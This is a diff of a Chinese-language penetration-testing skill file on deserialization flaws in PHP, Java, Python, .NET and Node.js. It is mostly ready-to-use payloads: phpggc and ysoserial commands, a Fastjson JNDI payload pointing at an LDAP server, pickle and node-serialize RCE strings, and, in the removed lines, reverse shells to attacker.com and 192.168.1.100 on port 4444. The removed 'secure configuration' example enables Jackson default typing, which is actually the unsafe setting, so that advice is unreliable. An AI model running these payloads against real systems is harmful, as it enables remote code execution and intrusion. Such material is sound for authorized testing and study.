@@ -1,310 +1,119 @@
 ---
 name: deserialization-testing
-description: 反序列化漏洞测试的专业技能和方法论
-version: 1.0.0
+description: 反序列化漏洞测试，覆盖PHP/Java/Python/.NET/Node.js的gadget链、检测方法和利用技巧
 ---
 
 # 反序列化漏洞测试
 
 ## 概述
 
-反序列化漏洞是一种利用应用程序反序列化不可信数据导致的漏洞，可能导致远程代码执行、拒绝服务等。本技能提供反序列化漏洞的检测、利用和防护方法。
+反序列化漏洞可导致RCE、权限提升和敏感数据泄露。本技能覆盖主流语言的gadget链和利用方法。
 
-## 漏洞原理
+## 1. PHP反序列化
 
-应用程序将序列化的数据反序列化为对象时，如果数据来源不可信，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。
+### 1.1 基础概念
 
-## 常见格式
-
-### Java
-
-**常见库：**
-- Java原生序列化
-- Jackson
-- Fastjson
-- XStream
-- Apache Commons Collections
-
-### PHP
-
-**常见函数：**
-- unserialize()
-- json_decode()
-
-### Python
-
-**常见模块：**
-- pickle
-- yaml
-- json
-
-### .NET
-
-**常见类：**
-- BinaryFormatter
-- SoapFormatter
-- DataContractSerializer
-
-## 测试方法
-
-### 1. 识别序列化数据
-
-**Java序列化特征：**
 ```
-AC ED 00 05 (十六进制)
-rO0 (Base64)
+序列化格式: O:<class_name_length>:"<class_name>":<property_count>:{...}
+魔法方法: __wakeup() / __destruct() / __toString() / __call() / __get() / __set()
 ```
 
-**PHP序列化特征：**
-```
-O:8:"stdClass"
-a:2:{s:4:"test";s:4:"data";}
-```
+### 1.2 常用Gadget链
 
-**Python pickle特征：**
-```
-\x80\x03
-```
-
-### 2. 检测反序列化点
-
-**常见位置：**
-- Cookie值
-- Session数据
-- API参数
-- 文件上传
-- 缓存数据
-- 消息队列
-
-### 3. Java反序列化
-
-**Apache Commons Collections利用：**
-```java
-// 使用ysoserial生成Payload
-java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
-```
-
-**常见Gadget链：**
-- CommonsCollections1-7
-- Spring1-2
-- ROME
-- Jdk7u21
-
-### 4. PHP反序列化
-
-**基础测试：**
 ```php
-<?php
-class Test {
-    public $cmd = "id";
-    function __destruct() {
-        system($this->cmd);
-    }
-}
-echo serialize(new Test());
-// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
-?>
+# 基础Payload格式
+O:N:"ClassName":N:{s:N:"prop";s:N:"value";}
+
+# 属性引用 (& 绕过 __wakeup 属性数量校验)
+O:N:"ClassName":N+1:{...}  # 属性数 > 实际数 → __wakeup被跳过
+
+# 常用利用类:
+# - Monolog → RCE
+# - SwiftMailer → 文件写入
+# - PHPUnit → RCE
+# - Guzzle → 文件读取
 ```
 
-**魔术方法利用：**
-- __destruct()
-- __wakeup()
-- __toString()
-- __call()
+### 1.3 phpggc工具
 
-### 5. Python pickle
+```bash
+# 生成Payload
+phpggc -l                          # 列出所有gadget链
+phpggc Monolog/RCE1 system id      # Monolog RCE
+phpggc Laravel/RCE5 system whoami  # Laravel RCE
+phpggc -u Monolog/RCE1 system id   # URL编码输出
+phpggc -b Monolog/RCE1 system id   # Base64输出
+```
 
-**基础测试：**
+## 2. Java反序列化
+
+### 2.1 检测方法
+
+```bash
+# 常见特征:
+# - Content-Type: application/x-java-serialized-object
+# - Base64编码的序列化数据 (rO0AB开头)
+# - 参数名: data/object/payload
+
+# ysoserial 工具
+java -jar ysoserial.jar CommonsCollections5 'whoami' | base64
+```
+
+### 2.2 常用Gadget链
+
+| Gadget | 适用场景 | 依赖 |
+|--------|---------|------|
+| CommonsCollections1-7 | Java < 8u71 | commons-collections 3.x/4.x |
+| CommonsBeanutils1 | 无CC依赖 | commons-beanutils |
+| Jdk7u21 | 无第三方依赖 | Java ≤ 7u21 |
+| Jre8u20 | 无第三方依赖 | Java 8u20 |
+| Spring1/2 | Spring应用 | spring-core |
+| Fastjson | Fastjson ≤ 1.2.80 | fastjson |
+| Jackson | Jackson启用defaultTyping | jackson-databind |
+
+### 2.3 Fastjson利用
+
+```json
+# 检测
+{"@type":"java.net.Inet4Address","val":"your-dns.dnslog.com"}
+
+# JNDI注入
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your-server/Exploit","autoCommit":true}
+```
+
+## 3. Python反序列化
+
 ```python
-import pickle
-import os
+# pickle反序列化RCE
+import pickle, os, base64
 
-class RCE:
+class Exploit:
     def __reduce__(self):
-        return (os.system, ('id',))
+        return (os.system, ('whoami',))
 
-pickle.dumps(RCE())
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+
+# PyYAML反序列化 (!!python/object)
+yaml.load(user_input)  # 危险!
 ```
 
-## 利用技术
+## 4. .NET反序列化
 
-### Java RCE
-
-**使用ysoserial：**
-```bash
-# 生成Payload
-java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin
-
-# Base64编码
-base64 -w 0 payload.bin
+```
+# ysoserial.net 工具
+# ViewState反序列化 (CVE-2020-0688)
+# BinaryFormatter / LosFormatter / ObjectStateFormatter
 ```
 
-**手动构造：**
-```java
-// 使用Gadget链构造恶意对象
-// 参考ysoserial源码
+## 5. Node.js反序列化
+
+```javascript
+// node-serialize RCE (CVE-2017-5941)
+// 利用IIFE (Immediately Invoked Function Expression)
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
 ```
 
-### PHP RCE
+---
 
-**利用POP链：**
-```php
-<?php
-class A {
-    public $b;
-    function __destruct() {
-        $this->b->test();
-    }
-}
-
-class B {
-    public $c;
-    function test() {
-        call_user_func($this->c, "id");
-    }
-}
-
-$a = new A();
-$a->b = new B();
-$a->b->c = "system";
-echo serialize($a);
-?>
-```
-
-### Python RCE
-
-**Pickle RCE：**
-```python
-import pickle
-import base64
-import os
-
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))
-
-payload = pickle.dumps(RCE())
-print(base64.b64encode(payload))
-```
-
-## 绕过技术
-
-### 编码绕过
-
-**Base64编码：**
-```
-原始: rO0ABXNy...
-编码: ck8wQUJYTnk...
-```
-
-**URL编码：**
-```
-%72%4F%00%AB...
-```
-
-### 过滤器绕过
-
-**使用不同Gadget链：**
-- 如果CommonsCollections被过滤，尝试Spring
-- 如果某个版本被过滤，尝试其他版本
-
-### 类名混淆
-
-**使用反射：**
-```java
-Class.forName("java.lang.Runtime").getMethod("exec", String.class)
-```
-
-## 工具使用
-
-### ysoserial
-
-```bash
-# 列出可用Gadget
-java -jar ysoserial.jar
-
-# 生成Payload
-java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
-
-# 生成Base64
-java -jar ysoserial.jar CommonsCollections1 "command" | base64
-```
-
-### PHPGGC
-
-```bash
-# 列出可用Gadget
-./phpggc -l
-
-# 生成Payload
-./phpggc Monolog/RCE1 system id
-
-# 生成编码Payload
-./phpggc -b Monolog/RCE1 system id
-```
-
-### Burp Suite
-
-1. 拦截包含序列化数据的请求
-2. 使用插件生成Payload
-3. 替换原始数据
-4. 观察响应
-
-## 验证和报告
-
-### 验证步骤
-
-1. 确认可以控制序列化数据
-2. 验证反序列化触发代码执行
-3. 评估影响（RCE、数据泄露等）
-4. 记录完整的POC
-
-### 报告要点
-
-- 漏洞位置和序列化数据格式
-- 使用的Gadget链或利用方式
-- 完整的利用步骤和PoC
-- 修复建议（输入验证、使用安全序列化等）
-
-## 防护措施
-
-### 推荐方案
-
-1. **避免反序列化不可信数据**
-   - 使用JSON替代
-   - 使用安全的序列化格式
-
-2. **输入验证**
-   ```java
-   // 白名单验证类名
-   private static final Set<String> ALLOWED_CLASSES = 
-       Set.of("com.example.SafeClass");
-   
-   private Object readObject(ObjectInputStream ois) {
-       // 验证类名
-       // ...
-   }
-   ```
-
-3. **使用安全配置**
-   ```java
-   // Jackson配置
-   objectMapper.enableDefaultTyping();
-   objectMapper.setVisibility(PropertyAccessor.FIELD, 
-       JsonAutoDetect.Visibility.ANY);
-   ```
-
-4. **类加载器隔离**
-   - 使用自定义ClassLoader
-   - 限制可加载的类
-
-5. **监控和日志**
-   - 记录反序列化操作
-   - 监控异常行为
-
-## 注意事项
-
-- 仅在授权测试环境中进行
-- 注意不同版本库的Gadget链差异
-- 测试时注意Payload大小限制
-- 了解目标应用的依赖库版本
+*参考: ysoserial/phpggc/ysoserial.net + PortSwigger Deserialization*
